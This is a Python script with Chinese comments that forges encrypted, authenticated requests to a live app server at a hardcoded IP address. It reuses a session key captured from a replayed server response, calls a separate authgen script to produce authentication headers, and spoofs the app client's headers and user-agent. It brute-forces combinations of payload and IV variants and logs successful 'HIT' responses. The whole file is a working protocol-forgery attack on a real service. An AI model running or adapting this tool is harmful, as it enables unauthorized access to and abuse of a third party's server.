"""forge_v4.py — 用服务器下发的 K16resp 作会话钥伪造请求
K16resp 来自重放响应 P0 (priv_from_go 解封) = 服务器生成的滚动会话钥
P0 载荷变体: K | K+K | K+md5(K) | K+sha256(K)[:16]
IV 变体:    K | md5(K) | sha256(K)[:16] | 0 | Krev | mon | sig
P1 明文:    b'' | b'{}'
"""
import base64
import hashlib
import json
import os
import random
import subprocess
import sys
import time
import urllib.error
import urllib.request

from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", "..", ".."))
sys.path.insert(0, os.path.join(ROOT, "src"))
from jcy_protocol.auth import ALPHABET, STD_B64  # noqa: E402

URL = "http://43.145.33.254:27990/app/video/device-base"
PUB = RSA.import_key(open(HERE + "/server_pub_2048_live.pem", "rb").read())
_TO_CUSTOM = str.maketrans(STD_B64, ALPHABET)

HEADERS_BASE = {
    "x-version": "2020-09-17",
    "user-agent": "Dart/3.6 (dart:io)",
    "appid": "4150439554430529",
    "tcs": "2",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "host": "43.145.33.254:27990",
}

MON_K = b"qPwClBj7j7ZQraSm"
SIG_K = b"p3JdVQl3q7WQJIgG"


def cb64(b):
    return base64.b64encode(b).decode().translate(_TO_CUSTOM)


def gen_auth(ts):
    out = subprocess.run(
        [sys.executable, "research/deliverables/authgen.py", "--ts", str(ts)],
        capture_output=True, text=True, timeout=300, cwd=ROOT)
    for line in (out.stdout + out.stderr).splitlines():
        if "auth" in line and "=" in line:
            v = line.split("=", 1)[1].strip()
            if len(v) >= 100:
                return v
    raise RuntimeError("authgen fail")


def send(tag, p0, p1):
    body = cb64(p0) + "." + cb64(p1)
    ts = int(time.time() * 1000)
    headers = dict(HEADERS_BASE)
    headers["ts"] = str(ts)
    headers["nonce"] = str(random.randint(10_000_000, 99_999_999))
    headers["authentication"] = gen_auth(ts)
    req = urllib.request.Request(URL, data=body.encode(), headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        rbody = resp.read().decode("utf-8", "replace")
        code = resp.status
    except urllib.error.HTTPError as e:
        rbody = e.read().decode("utf-8", "replace")
        code = e.code
    except Exception as e:
        print("  [%s] EXC %s" % (tag, e))
        return None
    hit = "." in rbody and len(rbody) > 100
    print("  [%s] http=%d len=%d %s" % (tag, code, len(rbody), "HIT" if hit else rbody[:60]))
    if hit:
        open(os.path.join(HERE, "forge_v4_hit.jsonl"), "a").write(
            json.dumps({"tag": tag, "body": body, "resp": rbody}) + "\n")
    return rbody


def main():
    K = b"3ME483VJDBQTEHD6"
    md5k = hashlib.md5(K).digest()
    shak = hashlib.sha256(K).digest()[:16]
    p0s = {
        "K": K,
        "K+K": K + K,
        "K+md5": K + md5k,
        "K+sha": K + shak,
        "K+mon": K + MON_K,
    }
    ivs = {"K": K, "md5": md5k, "sha": shak, "zero": bytes(16), "Krev": K[::-1],
           "mon": MON_K, "sig": SIG_K}
    for p0n, p0 in p0s.items():
        for ivn, iv in ivs.items():
            for plain in (b"", b"{}"):
                # P1 加密钥: 与 P0 载荷前 16B 一致 (K)
                p1 = AES.new(K, AES.MODE_CBC, iv).encrypt(pad(plain, 16))
                send("P0=%s|iv=%s|%s" % (p0n, ivn, "empty" if plain == b"" else "{}"), p0, p1)
    print("done")


if __name__ == "__main__":
    main()
